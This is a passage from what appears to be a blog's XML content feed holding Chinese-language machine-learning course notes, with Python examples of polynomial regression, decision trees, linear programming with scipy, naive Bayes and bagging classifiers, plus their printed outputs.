src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">t=np.arange(<span class="number">1</span>,<span class="number">17</span>,<span class="number">1</span>)</span><br><span class="line">t=t.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">y=np.array([<span class="number">4</span>,<span class="number">6.4</span>,<span class="number">8</span>,<span class="number">8.8</span>,<span class="number">9.22</span>,<span class="number">9.5</span>,<span class="number">9.7</span>,<span class="number">9.86</span>,<span class="number">10</span>,<span class="number">10.20</span>,<span class="number">10.32</span>,<span class="number">10.42</span>,<span class="number">10.5</span>,<span class="number">10.55</span>,<span class="number">10.58</span>,<span class="number">10.6</span></span><br><span class="line">])</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(t,y,<span class="string">&#x27;k*&#x27;</span>)</span><br><span class="line"><span class="comment"># y=at^2+bt+c</span></span><br><span class="line"></span><br><span class="line">lin_reg=LinearRegression()</span><br><span class="line">lin_reg.fit(t,y)</span><br><span class="line">plt.plot(t,lin_reg.predict(t).reshape(-<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_3_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">t=np.arange(<span class="number">1</span>,<span class="number">17</span>,<span class="number">1</span>)</span><br><span class="line">t=t.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">y=np.array([<span class="number">4</span>,<span class="number">6.4</span>,<span class="number">8</span>,<span class="number">8.8</span>,<span class="number">9.22</span>,<span class="number">9.5</span>,<span class="number">9.7</span>,<span class="number">9.86</span>,<span class="number">10</span>,<span class="number">10.20</span>,<span class="number">10.32</span>,<span class="number">10.42</span>,<span class="number">10.5</span>,<span class="number">10.55</span>,<span class="number">10.58</span>,<span class="number">10.6</span>])</span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(t,y,<span class="string">&#x27;k*&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># y=at^2+bt+c</span></span><br><span class="line"></span><br><span class="line">poly_features=pl(degree=<span class="number">2</span>,include_bias=<span class="literal">False</span>)</span><br><span class="line">x_poly=poly_features.fit_transform(t)</span><br><span class="line">lin_reg=LinearRegression()</span><br><span class="line">lin_reg.fit(x_poly,y)</span><br><span class="line">plt.plot(t,lin_reg.coef_[<span class="number">1</span>]*t**<span class="number">2</span>+lin_reg.coef_[<span class="number">0</span>]*t+lin_reg.intercept_)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_4_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>决策树</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E5%86%B3%E7%AD%96%E6%A0%91/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E5%86%B3%E7%AD%96%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"></span><br><span class="line">mnist=loadmat(<span class="string">&#x27;mnist-original.mat&#x27;</span>)</span><br><span class="line">x,y=mnist[<span class="string">&quot;data&quot;</span>],mnist[<span class="string">&quot;label&quot;</span>]</span><br><span class="line">x=x.T</span><br><span class="line">y=y[<span class="number">0</span>]</span><br><span class="line">some_digit=x[<span class="number">68888</span>]</span><br><span class="line">x_train=x[:<span class="number">60000</span>]</span><br><span class="line">y_train=y[:<span class="number">60000</span>]</span><br><span class="line">model=DecisionTreeClassifier(max_depth=<span class="number">10</span>)</span><br><span class="line">model.fit(x_train,y_train)</span><br><span class="line"><span class="built_in">print</span>(model.predict([some_digit]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>[8.]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_moons</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score <span class="keyword">as</span> cr<span class="comment">#调用交叉检验函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line">n_samples = <span class="number">600</span></span><br><span class="line">x,y=make_moons(n_samples=n_samples, noise=<span class="number">.1</span>,random_state=<span class="number">8</span>)</span><br><span class="line">model=DecisionTreeClassifier(criterion=<span class="string">&#x27;gini&#x27;</span>,max_depth=<span class="number">15</span>)</span><br><span class="line">model.fit(x,y)</span><br><span class="line"><span class="comment">#clf.predict([x])</span></span><br><span class="line">xmin,xmax=x[:,<span class="number">0</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">0</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line">ymin,ymax=x[:,<span class="number">1</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">1</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">xx,yy=np.meshgrid(np.arange(xmin,xmax,<span class="number">0.02</span>),np.arange(ymin,ymax,<span class="number">0.02</span>))</span><br><span class="line"></span><br><span class="line">xf=np.c_[xx.ravel(),yy.ravel()];</span><br><span class="line">z=model.predict(xf)</span><br><span class="line">z=z.reshape(xx.shape)</span><br><span class="line">plt.pcolormesh(xx,yy,z,cmap=plt.cm.Pastel1)</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>],x[:,<span class="number">1</span>],c=y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cr(model,x,y,cv=<span class="number">5</span>,scoring=<span class="string">&quot;accuracy&quot;</span>))</span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>[0.99166667 1.         0.98333333 0.98333333 0.98333333]c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:19: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3.  Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading'].  This will become an error two minor releases later.</code></pre><p><img "" class="lazyload placeholder" data-original="output_1_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> export_graphviz</span><br><span class="line"></span><br><span class="line">iris = load_iris()</span><br><span class="line">X = iris.data[:, <span class="number">2</span>:] <span class="comment"># petal length and width</span></span><br><span class="line">y = iris.target</span><br><span class="line">tree_clf = DecisionTreeClassifier(max_depth=<span class="number">3</span>)</span><br><span class="line">tree_clf.fit(X, y)</span><br><span class="line"></span><br><span class="line">export_graphviz(</span><br><span class="line">  tree_clf,</span><br><span class="line">  out_file=<span class="string">&quot;tree.dot&quot;</span>,</span><br><span class="line">  feature_names=iris.feature_names[<span class="number">2</span>:],</span><br><span class="line">  class_names=iris.target_names,</span><br><span class="line">  rounded=<span class="literal">True</span>,</span><br><span class="line">  filled=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性规划</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> optimize <span class="keyword">as</span> op</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="image-20211208163638086.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20211208163638086"></p><p>scipy.optimize.linprog(c, A_ub=None, b_ub=None, A_eq=None, b_eq=None, bounds=None, method=‘simplex’, callback=None, options=None)</p><p>很容易发现，c 指的应该是要求最大值的函数的系数数组，A_ub 是应该是不等式未知量的系数矩阵，仔细观察的人应该发现，为什么第一行里面写的是 [-2,5,-1] 而不是 [2,5,-1] 呢，应该要与图里对应才对啊，原来这不等式指的是 &lt;= 的不等式，那如果是 &gt;= 呢，乘个负号就行了。A_eq 就是其中等式的未知量系数矩阵了。B_ub 就是不等式的右边了，B_eq 就是等式右边了。bounds 的话，指的就是每个未知量的范围了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#目标函数，求最大值</span></span><br><span class="line">c=np.array([<span class="number">2</span>,<span class="number">3</span>,-<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#unbalence不等式，默认&lt;=，&gt;=乘-1</span></span><br><span class="line"><span class="comment">#不等式左系数矩阵</span></span><br><span class="line">A_ub=np.array([[-<span class="number">2</span>,<span class="number">5</span>,-<span class="number">1</span>],[<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>]])</span><br><span class="line"><span class="comment">#不等式右系数矩阵</span></span><br><span class="line">B_ub=np.array([-<span class="number">10</span>,<span class="number">12</span>])</span><br><span class="line"><span class="comment">#equation等式，A_eq为左系数矩阵，B_eq为右系数矩阵</span></span><br><span class="line">A_eq=np.array([[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]])<span class="comment">#注意双括号</span></span><br><span class="line">B_eq=np.array([<span class="number">7</span>])</span><br><span class="line"><span class="comment">#x1,x2,x3大于等于0</span></span><br><span class="line">x1=(<span class="number">0</span>,<span class="literal">None</span>)</span><br><span class="line">x2=(<span class="number">0</span>,<span class="literal">None</span>)</span><br><span class="line">x3=(<span class="number">0</span>,<span class="literal">None</span>)</span><br><span class="line"><span class="comment">#函数默认求最小值，-c，结果为负号</span></span><br><span class="line">res=op.linprog(-c,A_ub,B_ub,A_eq,B_eq,bounds=(x1,x2,x3))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>     con: array([1.80713489e-09])     fun: -14.571428565645059 message: 'Optimization terminated successfully.'     nit: 5   slack: array([-2.24614993e-10,  3.85714286e+00])  status: 0 success: True       x: array([6.42857143e+00, 5.71428571e-01, 2.35900788e-10])</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [<span class="number">6.42857143e+00</span>, <span class="number">5.71428571e-01</span>, <span class="number">2.35900788e-10</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>*x[<span class="number">0</span>] + <span class="number">3</span>*x[<span class="number">1</span>] -<span class="number">5</span>*x[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><pre><code>14.571428571820496</code></pre>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>朴素贝叶斯</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> BernoulliNB <span class="comment">#伯努利分布,适用于离散型数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB <span class="comment">#高斯分布，适用于连续型数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> MultinomialNB <span class="comment">#多项式分布</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"></span><br><span class="line">mnist=loadmat(<span class="string">&#x27;mnist-original.mat&#x27;</span>)</span><br><span class="line">x,y=mnist[<span class="string">&quot;data&quot;</span>],mnist[<span class="string">&quot;label&quot;</span>]</span><br><span class="line">x=x.T</span><br><span class="line">y=y[<span class="number">0</span>]</span><br><span class="line">x_train,x_test,y_train,y_test=train_test_split(x,y,random_state=<span class="number">5</span>)</span><br><span class="line">nb=BernoulliNB()</span><br><span class="line">nb.fit(x_train,y_train)</span><br><span class="line">a=nb.score(x_test,y_test)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>0.828</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> BernoulliNB <span class="comment">#伯努利分布,适用于离散型数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB <span class="comment">#高斯分布，适用于连续型数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> MultinomialNB <span class="comment">#多项式分布，</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"></span><br><span class="line">x, y= make_blobs(n_samples = <span class="number">1000</span>, <span class="comment">#生成300条数据</span></span><br><span class="line">                       centers =<span class="number">5</span>, <span class="comment">#5类数据</span></span><br><span class="line">                       cluster_std = <span class="number">0.7</span>, <span class="comment">#方差一致</span></span><br><span class="line">                       random_state = <span class="number">8</span>) <span class="comment">#随机数种子</span></span><br><span class="line">nb=GaussianNB()</span><br><span class="line">nb.fit(x,y)</span><br><span class="line">z=nb.predict(x)</span><br><span class="line">a=nb.score(x,y)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>],c=y)</span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>],c=z)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>0.982</code></pre><p><img "" class="lazyload placeholder" data-original="output_1_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><img "" class="lazyload placeholder" data-original="output_1_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_moons</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> BernoulliNB <span class="comment">#伯努利分布,适用于离散型数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB <span class="comment">#高斯分布，适用于连续型数据</span></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> MultinomialNB <span class="comment">#多项式分布</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score <span class="keyword">as</span> cr<span class="comment">#调用交叉检验函数</span></span><br><span class="line">n_samples = <span class="number">600</span></span><br><span class="line">x,y=make_moons(n_samples=n_samples, noise=<span class="number">0.1</span>,random_state=<span class="number">8</span>)</span><br><span class="line">x=x+<span class="number">2</span>;</span><br><span class="line"><span class="comment">#clf= MultinomialNB()</span></span><br><span class="line">clf= GaussianNB()</span><br><span class="line">clf.fit(x,y)</span><br><span class="line"><span class="comment">#clf.predict([x])</span></span><br><span class="line">xmin,xmax=x[:,<span class="number">0</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">0</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line">ymin,ymax=x[:,<span class="number">1</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">1</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">xx,yy=np.meshgrid(np.arange(xmin,xmax,<span class="number">0.02</span>),np.arange(ymin,ymax,<span class="number">0.02</span>))</span><br><span class="line"></span><br><span class="line">xf=np.c_[xx.ravel(),yy.ravel()];</span><br><span class="line">z=clf.predict(xf)</span><br><span class="line">z=z.reshape(xx.shape)</span><br><span class="line">plt.pcolormesh(xx,yy,z,cmap=plt.cm.Pastel1)</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>],x[:,<span class="number">1</span>],c=y)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cr(clf,x,y,cv=<span class="number">5</span>,scoring=<span class="string">&quot;accuracy&quot;</span>))</span><br><span class="line"></span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>[0.9        0.88333333 0.9        0.85833333 0.86666667]c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:25: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3.  Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading'].  This will become an error two minor releases later.</code></pre><p><img "" class="lazyload placeholder" data-original="output_2_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机森林</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#begging</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_moons</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> BaggingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"></span><br><span class="line">n_samples = <span class="number">2000</span></span><br><span class="line">X_train, y_train=make_moons(n_samples=n_samples, noise=<span class="number">.3</span>,random_state=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">bag_clf = BaggingClassifier(DecisionTreeClassifier(), n_estimators=<span class="number">500</span>,max_samples=<span class="number">100</span>, bootstrap=<span class="literal">True</span>, n_jobs=-<span class="number">1</span>)</span><br><span class="line">bag_clf.fit(X_train[<span class="number">0</span>:<span class="number">1500</span>], y_train[<span class="number">0</span>:<span class="number">1500</span>])</span><br><span class="line">y_pred = bag_clf.predict(X_train[<span class="number">1500</span>:])</span><br><span class="line"><span class="built_in">print</span>(accuracy_score(y_train[<span class="number">1500</span>:], y_pred))</span><br><span class="line"></span><br><span class="line">plt.figure();</span><br><span class="line">plt.scatter(X_train[:,<span class="number">0</span>],X_train[:,<span class="number">1</span>],c=y_train)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>0.9</code></pre><p><img "" class="lazyload placeholder" data-original="output_0_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RandomForest</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_moons</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> accuracy_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span 